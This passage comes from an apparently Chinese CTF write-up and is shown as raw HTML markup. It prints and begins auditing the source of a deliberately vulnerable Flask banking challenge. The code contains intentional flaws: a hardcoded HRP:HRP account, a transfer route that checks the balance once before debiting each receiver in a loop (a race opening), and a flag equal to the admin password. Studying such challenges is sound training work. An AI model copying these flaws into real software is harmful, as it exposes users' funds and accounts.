punctuation">(</span><span class="token string">'%Y-%m-%d %H:%M:%S.%f'</span><span class="token punctuation">)</span>        <span class="token comment"># Encrypt the amount and timestamp</span>    encrypted_amount <span class="token operator">=</span> encrypt_data_with_rsa<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span>    encrypted_timestamp <span class="token operator">=</span> encrypt_data_with_rsa<span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span>        log_data <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>encrypted_timestamp<span class="token punctuation">&#125;</span></span><span class="token string"> - Transfer from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>sender<span class="token punctuation">&#125;</span></span><span class="token string"> to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>receiver<span class="token punctuation">&#125;</span></span><span class="token string"> of encrypted amount </span><span class="token interpolation"><span class="token punctuation">&#123;</span>encrypted_amount<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         log_data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"Transaction initiated from device: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Mobile'</span><span class="token punctuation">,</span> <span class="token string">'Web'</span><span class="token punctuation">,</span> <span class="token string">'ATM'</span><span class="token punctuation">,</span> <span class="token string">'In-Branch Terminal'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        log_data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"Initiator IP address: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'192.168.1.'</span><span class="token punctuation">,</span> <span class="token string">'10.0.0.'</span><span class="token punctuation">,</span> <span class="token string">'172.16.0.'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        log_data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"Initiator geolocation: Latitude </span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">.6f</span><span class="token punctuation">&#125;</span></span><span class="token string">, Longitude </span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">.6f</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        log_data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"Receiver's last login device: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Mobile'</span><span class="token punctuation">,</span> <span class="token string">'Web'</span><span class="token punctuation">,</span> <span class="token string">'ATM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        log_data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"Associated fees: $</span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token number">3.0</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">.2f</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        log_data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"Remarks: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Regular transfer'</span><span class="token punctuation">,</span> <span class="token string">'Payment for invoice #'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'Refund for transaction #'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        log_data <span class="token operator">+=</span> <span class="token string">"-"</span><span class="token operator">*</span><span class="token number">50</span> <span class="token operator">+</span> <span class="token string">"\n"</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'transfer_log.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>log_data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/transfer'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Not logged in"</span><span class="token punctuation">,</span> <span class="token number">403</span>        receivers <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">"receiver"</span><span class="token punctuation">)</span>    amount <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"amount"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> amount <span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Insufficient funds"</span><span class="token punctuation">,</span> <span class="token number">400</span>    logging_enabled <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"logs"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"true"</span>        <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token keyword">in</span> receivers<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Cannot transfer to self"</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">for</span> receiver <span class="token keyword">in</span> receivers<span class="token punctuation">:</span>        <span class="token keyword">if</span> receiver <span class="token keyword">not</span> <span class="token keyword">in</span> users<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Invalid user </span><span class="token interpolation"><span class="token punctuation">&#123;</span>receiver<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token number">400</span>        total_amount <span class="token operator">=</span> amount <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>receivers<span class="token punctuation">)</span>    <span class="token keyword">if</span> users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">>=</span> total_amount<span class="token punctuation">:</span>        <span class="token keyword">for</span> receiver <span class="token keyword">in</span> receivers<span class="token punctuation">:</span>            <span class="token keyword">if</span> logging_enabled<span class="token punctuation">:</span>                log_transfer<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> receiver<span class="token punctuation">,</span> amount<span class="token punctuation">)</span>            mutex<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>            users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">-=</span> amount            users<span class="token punctuation">[</span>receiver<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">+=</span> amount            mutex<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Insufficient funds"</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/buy_flag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Not logged in"</span><span class="token punctuation">,</span> <span class="token number">403</span>    <span class="token keyword">if</span> users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">>=</span> flag_price<span class="token punctuation">:</span>        users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">-=</span> flag_price        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Here is your flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">return</span> <span class="token string">"Insufficient funds"</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_users'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_users</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'num'</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    selected_users <span class="token operator">=</span> random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>users<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"users"</span><span class="token punctuation">:</span> selected_users<span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/view_balance/&lt;username>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view_balance</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> username <span class="token keyword">in</span> users<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token string">"User not found"</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/force_buy_flag'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">force_buy_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session <span class="token keyword">or</span> session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"HRP"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Permission denied"</span><span class="token punctuation">,</span> <span class="token number">403</span>    target_user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"target_user"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> target_user <span class="token keyword">not</span> <span class="token keyword">in</span> users<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"User not found"</span><span class="token punctuation">,</span> <span class="token number">404</span>    <span class="token keyword">if</span> users<span class="token punctuation">[</span>target_user<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">>=</span> flag_price<span class="token punctuation">:</span>        users<span class="token punctuation">[</span>target_user<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">-=</span> flag_price        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"User </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_user<span class="token punctuation">&#125;</span></span><span class="token string"> successfully bought the flag!,"</span></span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"Here is your flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"User </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_user<span class="token punctuation">&#125;</span></span><span class="token string"> does not have sufficient funds"</span></span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码很长，一步一步边分析功能边审计</p><p>先是登录路由 &#x2F;login</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Invalid credentials"</span><span class="token punctuation">,</span> <span class="token number">403</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要找个账户和密码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Generate random users</span><span class="token keyword">def</span> <span class="token function">generate_random_users</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">2000</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> usersusers <span class="token operator">=</span> generate_random_users<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>users<span class="token punctuation">[</span><span class="token string">"HRP"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"HRP"</span><span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">6000</span><span class="token punctuation">&#125;</span><span class="token comment"># Add an admin user with a random password</span>admin_password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> admin_password<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">&#125;</span>flag_price <span class="token operator">=</span> <span class="token number">10000</span>flag <span class="token operator">=</span> admin_password  <span class="token comment"># The flag is the password of the admin user</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">/</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/reset'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> users    users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token comment"># Clear all existing users</span>    users <span class="token operator">=</span> generate_random_users<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>    users<span class="token punctuation">[</span><span class="token string">"HRP"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"HRP"</span><span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">6000</span><span class="token punctuation">&#125;</span>    <span class="token keyword">global</span> admin_password    admin_password<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">global</span> flag    <span class="token comment"># Add an admin user with a random password</span>    admin_password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    flag<span class="token operator">=</span>admin_password    users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> admin_password<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里拿到账密<code>HRP:HRP</code>，HRP用户有6000块，admin没有钱，其它用户每人有2000块，同时得知 flag 要10000块，而且是 admin 的password</p><p>登录进去，接下来有下面这些功能</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/transfer'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Not logged in"</span><span class="token punctuation">,</span> <span class="token number">403</span>        receivers <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>getlist<span class="token punctuation">(</span><span class="token string">"receiver"</span><span class="token punctuation">)</span>    amount <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"amount"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> amount <span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Insufficient funds"</span><span class="token punctuation">,</span> <span class="token number">400</span>    logging_enabled <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"logs"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"true"</span>        <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token keyword">in</span> receivers<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Cannot transfer to self"</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">for</span> receiver <span class="token keyword">in</span> receivers<span class="token punctuation">:</span>        <span class="token keyword">if</span> receiver <span class="token keyword">not</span> <span class="token keyword">in</span> users<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Invalid user </span><span class="token interpolation"><span class="token punctuation">&#123;</span>receiver<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token number">400</span>        total_amount <span class="token operator">=</span> amount <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>receivers<span class="token punctuation">)</span>    <span class="token keyword">if</span> users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">>=</span> total_amount<span class="token punctuation">:</span>        <span class="token keyword">for</span> receiver <span class="token keyword">in</span> receivers<span class="token punctuation">:</span>            <span class="token keyword">if</span> logging_enabled<span class="token punctuation">:</span>                log_transfer<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> receiver<span class="token punctuation">,</span> amount<span class="token punctuation">)</span>            mutex<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span>            users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">-=</span> amount            users<span class="token punctuation">[</span>receiver<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span> <span class="token operator">+=</span> amount            mutex<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Insufficient funds"</span><span class="token 